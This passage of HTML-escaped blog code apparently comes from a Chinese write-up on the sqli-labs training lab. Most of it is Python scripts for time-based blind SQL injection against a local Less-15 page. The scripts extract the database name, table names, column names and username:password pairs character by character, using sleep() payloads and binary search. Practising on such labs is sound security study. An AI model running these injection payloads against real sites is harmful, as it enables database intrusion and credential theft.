class=&#34;line&#34;&gt;			&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				high = mid&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			mid = (low + high) // &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; mid == &lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		name = name + &lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(mid)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;inject_database(url)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# inject_table(url)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# inject_column(url)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#基于时间盲注&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; time&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;url = &lt;span class=&#34;string&#34;&gt;&amp;quot;http://127.0.0.1/sqllabs/Less-15/&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;inject_database&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;url&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    name = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;100000&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        low = &lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        high = &lt;span class=&#34;number&#34;&gt;128&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        mid = (low + high) // &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; low &amp;lt; high:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            payload = &lt;span class=&#34;string&#34;&gt;&amp;quot;admin&amp;#x27; and if(ascii(substr((select database()),%d,1))&amp;gt;%d,sleep(1),0)#&amp;quot;&lt;/span&gt; % (i, mid)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            data = &amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;#x27;uname&amp;#x27;&lt;/span&gt;: payload, &lt;span class=&#34;string&#34;&gt;&amp;#x27;passwd&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;#x27;aaaaa&amp;#x27;&lt;/span&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;comment&#34;&gt;#params = &amp;#123;&amp;quot;id&amp;quot;: payload&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            start_time = time.time()  &lt;span class=&#34;comment&#34;&gt;# 注入前的系统时间&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            r = requests.post(url, data=data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            end_time = time.time()  &lt;span class=&#34;comment&#34;&gt;# 注入后的时间&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; end_time - start_time &amp;gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                low = mid + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                high = mid&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            mid = (low + high) // &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; mid == &lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        name = name + &lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(mid)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;inject_table&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;url&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    name = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;100000&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        low = &lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        high = &lt;span class=&#34;number&#34;&gt;128&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        mid = (low + high) // &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; low &amp;lt; high:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            payload = &lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;#x27; and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&amp;#x27;security&amp;#x27;),%d,1))&amp;gt;%d,sleep(1),0)-- &amp;quot;&lt;/span&gt; % (&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            i, mid)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            params = &amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;#x27;id&amp;#x27;&lt;/span&gt;: payload&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            start_time = time.time()  &lt;span class=&#34;comment&#34;&gt;# 注入前的系统时间&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            r = requests.get(url, params=params)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            end_time = time.time()  &lt;span class=&#34;comment&#34;&gt;# 注入后的时间&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; end_time - start_time &amp;gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                low = mid + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                high = mid&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            mid = (low + high) // &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; mid == &lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        name = name + &lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(mid)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;inject_column&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;url&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    name = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;100000&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        low = &lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        high = &lt;span class=&#34;number&#34;&gt;128&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        mid = (low + high) // &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; low &amp;lt; high:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            payload = &lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;#x27; and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&amp;#x27;security&amp;#x27; and table_name=&amp;#x27;users&amp;#x27;),%d,1))&amp;gt;%d,sleep(1),0)-- &amp;quot;&lt;/span&gt; % (&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            i, mid)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            params = &amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;#x27;id&amp;#x27;&lt;/span&gt;: payload&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            start_time = time.time()  &lt;span class=&#34;comment&#34;&gt;# 注入前的系统时间&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            r = requests.get(url, params=params)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            end_time = time.time()  &lt;span class=&#34;comment&#34;&gt;# 注入后的时间&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; end_time - start_time &amp;gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                low = mid + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                high = mid&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            mid = (low + high) // &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; mid == &lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        name = name + &lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(mid)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;inject_data&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;url&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    name = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;100000&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        low = &lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        high = &lt;span class=&#34;number&#34;&gt;128&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        mid = (low + high) // &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; low &amp;lt; high:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            payload = &lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;#x27; and if(ascii(substr((select concat(username,0x3a,password) from users limit 0,1),%d,1))&amp;gt;%d,sleep(1),0)-- &amp;quot;&lt;/span&gt; % (i, mid)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            params = &amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;#x27;id&amp;#x27;&lt;/span&gt;: payload&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            start_time = time.time()  &lt;span class=&#34;comment&#34;&gt;# 注入前的系统时间&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            r = requests.get(url, params=params)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            end_time = time.time()  &lt;span class=&#34;comment&#34;&gt;# 注入后的时间&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; end_time - start_time &amp;gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                low = mid + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                high = mid&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            mid = (low + high) // &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; mid == &lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        name = name + &lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(mid)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;inject_database(url)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# inject_table(url)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# inject_column(url)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# inject_data(url)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span 